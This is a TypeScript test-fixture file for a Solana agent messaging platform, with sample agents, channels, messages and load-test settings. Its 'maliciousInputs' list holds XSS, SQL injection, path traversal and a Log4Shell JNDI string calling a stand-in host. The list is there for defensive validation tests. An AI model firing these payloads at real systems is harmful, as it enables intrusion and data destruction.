import { generateKeyPairSigner, createKeyPairSignerFromBytes, type KeyPairSigner } from '@solana/web3.js';

export interface AgentTestData {
  name: string;
  description: string;
  capabilities: number;
  metadata: {
    version: string;
    type: 'ai' | 'human' | 'hybrid';
    tags: string[];
  };
  keyPairSigner: KeyPairSigner;
}

export interface ChannelTestData {
  name: string;
  description: string;
  isPrivate: boolean;
  features: string[];
  id: string;
}

export interface MessageTestData {
  content: string;
  type: 'direct' | 'channel' | 'system' | 'command';
  encrypted: boolean;
  metadata: Record<string, any>;
}

/**
 * Deterministic test agents following testing standards
 * Note: These are async functions due to Web3.js v2 KeyPairSigner creation
 */
export async function createTestAgents(): Promise<AgentTestData[]> {
  return [
    {
      name: 'TestBot Alpha',
      description: 'Primary test agent for basic functionality',
      capabilities: 0b11111, // All capabilities enabled
      metadata: {
        version: '1.0.0',
        type: 'ai',
        tags: ['test', 'primary', 'full-featured']
      },
      keyPairSigner: await createKeyPairSignerFromBytes(new Uint8Array([
        // Deterministic keypair for consistent testing
        174, 47, 154, 16, 202, 193, 206, 113, 199, 190, 53, 133, 169, 175, 31, 56,
        222, 53, 138, 189, 224, 216, 117, 173, 10, 149, 53, 45, 73, 251, 237, 246,
        198, 240, 148, 207, 251, 193, 206, 113, 199, 190, 53, 133, 169, 175, 31, 56,
        222, 53, 138, 189, 224, 216, 117, 173, 10, 149, 53, 45, 73, 251, 237, 246
      ]))
    },
    {
      name: 'TestBot Beta',
      description: 'Secondary test agent for communication tests',
      capabilities: 0b00001, // Communication only
      metadata: {
        version: '1.0.0',
        type: 'ai',
        tags: ['test', 'secondary', 'communication']
      },
      keyPairSigner: await createKeyPairSignerFromBytes(new Uint8Array([
        175, 48, 155, 17, 203, 194, 207, 114, 200, 191, 54, 134, 170, 176, 32, 57,
        223, 54, 139, 190, 225, 217, 118, 174, 11, 150, 54, 46, 74, 252, 238, 247,
        199, 241, 149, 208, 252, 194, 207, 114, 200, 191, 54, 134, 170, 176, 32, 57,
        223, 54, 139, 190, 225, 217, 118, 174, 11, 150, 54, 46, 74, 252, 238, 247
      ]))
    },
    {
      name: 'TestBot Gamma',
      description: 'Performance test agent for load testing',
      capabilities: 0b01010, // Trading and analysis
      metadata: {
        version: '1.0.0',
        type: 'hybrid',
        tags: ['test', 'performance', 'trading', 'analysis']
      },
      keyPairSigner: await createKeyPairSignerFromBytes(new Uint8Array([
        176, 49, 156, 18, 204, 195, 208, 115, 201, 192, 55, 135, 171, 177, 33, 58,
        224, 55, 140, 191, 226, 218, 119, 175, 12, 151, 55, 47, 75, 253, 239, 248,
        200, 242, 150, 209, 253, 195, 208, 115, 201, 192, 55, 135, 171, 177, 33, 58,
        224, 55, 140, 191, 226, 218, 119, 175, 12, 151, 55, 47, 75, 253, 239, 248
      ]))
    }
  ];
}

/**
 * Test channels for various scenarios
 */
export const TEST_CHANNELS: ChannelTestData[] = [
  {
    name: 'General Testing',
    description: 'Primary channel for general test communications',
    isPrivate: false,
    features: ['encryption', 'ai-agents'],
    id: 'ch_test_general_001'
  },
  {
    name: 'Private Test Group',
    description: 'Private channel for secure communication tests',
    isPrivate: true,
    features: ['encryption', 'token-gate', 'voting'],
    id: 'ch_test_private_001'
  },
  {
    name: 'Performance Channel',
    description: 'Channel for load and performance testing',
    isPrivate: false,
    features: ['ai-agents', 'files'],
    id: 'ch_test_performance_001'
  }
];

/**
 * Test messages for different scenarios
 */
export const TEST_MESSAGES: MessageTestData[] = [
  {
    content: 'Hello, this is a test message!',
    type: 'direct',
    encrypted: true,
    metadata: { priority: 'normal', timestamp: 1640995200000 }
  },
  {
    content: 'Channel announcement for testing',
    type: 'channel',
    encrypted: false,
    metadata: { priority: 'high', timestamp: 1640995260000 }
  },
  {
    content: 'System notification test',
    type: 'system',
    encrypted: false,
    metadata: { priority: 'low', timestamp: 1640995320000 }
  },
  {
    content: '/help test command',
    type: 'command',
    encrypted: false,
    metadata: { command: 'help', args: ['test'], timestamp: 1640995380000 }
  }
];

/**
 * Edge case test data following testing standards
 */
export const EDGE_CASE_DATA = {
  // Boundary values
  maxLengthName: 'x'.repeat(50), // Maximum allowed name length
  emptyName: '',
  unicodeName: '🤖🚀💬📊🔧',
  
  // Large content
  maxMessage: 'x'.repeat(1000), // Maximum message length
  emptyMessage: '',
  unicodeMessage: '🎉'.repeat(100),
  
  // Invalid data
  invalidCapabilities: [-1, 999999, NaN, Infinity],
  invalidNetworks: ['invalid', '', null, undefined],
  
  // Performance data
  largeDataset: Array.from({ length: 1000 }, (_, i) => ({
    id: i,
    data: `performance_test_data_${i}`,
    timestamp: Date.now() + i
  })),
  
  // Security test data
  maliciousInputs: [
    '<script>alert("xss")</script>',
    '"; DROP TABLE agents; --',
    '../../etc/passwd',
    '\x00\x01\x02\x03',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '${jndi:ldap://evil.com/a}'
  ]
};

/**
 * Network test scenarios
 */
export const NETWORK_SCENARIOS = {
  normal: {
    latency: 50, // 50ms
    packetLoss: 0,
    bandwidth: 1000 // 1Gbps
  },
  slow: {
    latency: 500, // 500ms
    packetLoss: 0.1, // 10% packet loss
    bandwidth: 10 // 10Mbps
  },
  unstable: {
    latency: 200, // Variable latency
    packetLoss: 0.05, // 5% packet loss
    bandwidth: 100 // 100Mbps
  }
};

/**
 * Performance test configuration
 */
export const PERFORMANCE_TESTS = {
  loadTest: {
    agentCount: 100,
    messageRate: 1000, // messages per second
    duration: 60000, // 1 minute
    concurrency: 10
  },
  stressTest: {
    agentCount: 1000,
    messageRate: 10000, // messages per second
    duration: 300000, // 5 minutes
    concurrency: 50
  },
  enduranceTest: {
    agentCount: 50,
    messageRate: 100, // messages per second
    duration: 3600000, // 1 hour
    concurrency: 5
  }
};

/**
 * Test data factory functions
 */
export class TestDataFactory {
  static async createRandomAgent(): Promise<AgentTestData> {
    const names = ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon'];
    const types: ('ai' | 'human' | 'hybrid')[] = ['ai', 'human', 'hybrid'];
    
    return {
      name: `TestBot ${names[Math.floor(Math.random() * names.length)]}`,
      description: `Generated test agent ${Date.now()}`,
      capabilities: Math.floor(Math.random() * 32), // Random capabilities
      metadata: {
        version: '1.0.0',
        type: types[Math.floor(Math.random() * types.length)] || types[0] || 'ai',
        tags: ['test', 'generated', 'random']
      },
      keyPairSigner: await generateKeyPairSigner()
    };
  }

  static createRandomMessage(): MessageTestData {
    const types: ('direct' | 'channel' | 'system' | 'command')[] = ['direct', 'channel', 'system', 'command'];
    const contents = [
      'Random test message',
      'Performance test data',
      'Automated test content',
      'Generated message payload'
    ];

    return {
      content: `${contents[Math.floor(Math.random() * contents.length)]} ${Date.now()}`,
      type: types[Math.floor(Math.random() * types.length)] || 'direct',
      encrypted: Math.random() > 0.5,
      metadata: {
        timestamp: Date.now(),
        random: Math.random(),
        generated: true
      }
    };
  }

  static async createPerformanceDataset(size: number): Promise<any[]> {
    const result = [];
    for (let i = 0; i < size; i++) {
      result.push({
        id: i,
        agent: await this.createRandomAgent(),
        message: this.createRandomMessage(),
        timestamp: Date.now() + i,
        sequence: i
      });
    }
    return result;
  }
}

/**
 * Cleanup utilities for test data
 */
export class TestDataCleanup {
  static async cleanupAgents(agentIds: string[]): Promise<void> {
    // Implementation would clean up test agents from blockchain
    console.log(`Cleaning up ${agentIds.length} test agents`);
  }

  static async cleanupChannels(channelIds: string[]): Promise<void> {
    // Implementation would clean up test channels
    console.log(`Cleaning up ${channelIds.length} test channels`);
  }

  static async cleanupAll(): Promise<void> {
    // Implementation would clean up all test data
    console.log('Cleaning up all test data');
  }
} 